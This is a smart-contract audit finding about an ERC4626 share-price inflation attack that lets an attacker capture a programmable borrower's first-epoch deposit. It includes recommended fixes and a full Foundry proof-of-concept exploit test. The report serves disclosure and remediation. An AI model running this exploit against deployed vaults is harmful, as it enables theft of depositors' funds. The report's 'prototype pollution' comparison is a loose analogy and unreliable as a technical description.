### Title
Unvalidated ERC4626 deposit lets share-price inflation seize programmable-borrower principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` accepts any ERC4626 vault with a matching asset and deposits idle pool funds without checking that the deposit minted shares or preserved share value. A public-vault user can inflate the vault’s share price before the first epoch, cause the programmable borrower to receive zero shares, and redeem the pool’s deposit for themselves.

### Finding Description
The programmable borrower can be initialized with any ERC4626 vault whose `asset()` matches the CDO underlying; there is no requirement for an established vault, virtual shares, a minimum share output, or a post-deposit solvency check. [1](#0-0) 

At epoch start, the CDO transfers surplus underlying to the borrower before invoking the programmable-borrower hook. [2](#0-1)  `onStartEpoch` snapshots the cash balance as principal and then deposits it into the configured vault. [3](#0-2) 

`_depositToVault` accepts the returned share amount unconditionally. If an attacker first creates a one-share position and then donates enough underlying to make one share worth more than the pool deposit, an ERC4626 using raw assets/supply conversion mints zero shares to the programmable borrower while retaining its assets. [4](#0-3) 

This is analogous to prototype pollution: an attacker writes to shared conversion state before the victim’s deposit, so the victim’s deposit does not create an “own” recoverable share position. The contract later derives its vault exposure solely from `vault.convertToAssets(vault.balanceOf(address(this)))`, so zero shares mean zero recoverable assets. [5](#0-4) 

### Impact Explanation
For a first programmable epoch funded with `A` underlying, the attacker can receive `A` in net profit. The attacker’s initial deposit and donation are returned on redemption, while the pool’s `A` remains captured in the attacker’s share payout.

The programmable borrower then reports zero vault assets and zero borrowable liquidity. [6](#0-5)  Its epoch accounting treats the missing principal as vault loss because the epoch baseline still contains the pre-deposit amount while current vault assets are zero. [7](#0-6)  A close or withdrawal eventually requires cash that the programmable borrower no longer holds, causing borrower default, recovery haircuts, or permanently unpaid claims.

### Likelihood Explanation
The attack requires the configured ERC4626 to permit an attacker to control substantially all outstanding shares and to calculate share price from donatable raw assets. Empty or newly deployed ERC4626 vaults without virtual-share offsets satisfy this condition. The attacker needs no privileged role; ordinary vault deposits and a direct asset donation are sufficient, and the transaction only has to precede the first `startEpoch` deposit.

### Recommendation
Require a minimum nonzero share result and compare received shares against `convertToShares(_assetAmount)` or an operator-configured slippage bound in `_depositToVault`. Additionally, verify that `convertToAssets(shares)` is within an accepted tolerance of the deposited amount immediately after depositing. Prefer vaults with virtual-share inflation protection and document that empty or attacker-dominated vaults must be seeded safely before configuring them.

### Proof of Concept

  --match-test testShareInflationStealsFirstEpochDeposit -vv

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProgrammableBorrower} from
  "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract PoCToken is ERC20 {
  constructor() ERC20("Vault Asset", "ASSET") {}

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract InflatableERC4626 is ERC20 {
  PoCToken public immutable assetToken;

  constructor(address _asset) ERC20("Vault Share", "SHARE") {
    assetToken = PoCToken(_asset);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    uint256 supply = totalSupply();
    shares = supply == 0
      ? assets
      : assets * supply / totalAssets();

    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function withdraw(uint256, address, address)
    external
    pure
    returns (uint256)
  {
    revert("unused");
  }
}

contract PoCCdo {
  address public token;

  constructor(address _token) {
    token = _token;
  }
}

contract ProgrammableBorrowerVaultInflationPoC is Test {
  function testShareInflationStealsFirstEpochDeposit() external {
    address attacker = makeAddr("attacker");
    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");
    address proxyAdmin = makeAddr("proxyAdmin");

    PoCToken underlying = new PoCToken();
    InflatableERC4626 vault = new InflatableERC4626(address(underlying));
    PoCCdo cdo = new PoCCdo(address(underlying));

    ProgrammableBorrower implementation = new ProgrammableBorrower();
    ProgrammableBorrower programmable = ProgrammableBorrower(
      address(
        new TransparentUpgradeableProxy(
          address(implementation),
          proxyAdmin,
          abi.encodeWithSelector(
            ProgrammableBorrower.initialize.selector,
            address(vault),
            address(cdo),
            owner,
            manager,
            borrower,
            0
          )
        )
      )
    );

    uint256 poolDeposit = 1_000_000e6;

    underlying.mint(attacker, poolDeposit + 2);

    vm.startPrank(attacker);
    underlying.approve(address(vault), type(uint256).max);

    // Attacker creates the first share and inflates its price above the
    // programmable borrower's forthcoming deposit.
    vault.deposit(1, attacker);
    underlying.transfer(address(vault), poolDeposit + 1);
    vm.stopPrank();

    // Model IdleCDOEpochVariant sending epoch funds before onStartEpoch.
    underlying.mint(address(programmable), poolDeposit);

    vm.prank(address(cdo));
    programmable.onStartEpoch(0);

    // The deposit entered the vault, but the programmable borrower owns no shares.
    assertEq(programmable.vaultSharesBalance(), 0);
    assertEq(programmable.totalUnderlying(), 0);

    uint256 attackerBefore = underlying.balanceOf(attacker);

    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    // The attacker receives the original 1 asset, the donation of
    // poolDeposit + 1, and the pool's poolDeposit.
    assertEq(
      underlying.balanceOf(attacker) - attackerBefore,
      2 * poolDeposit + 2
    );
  }
}
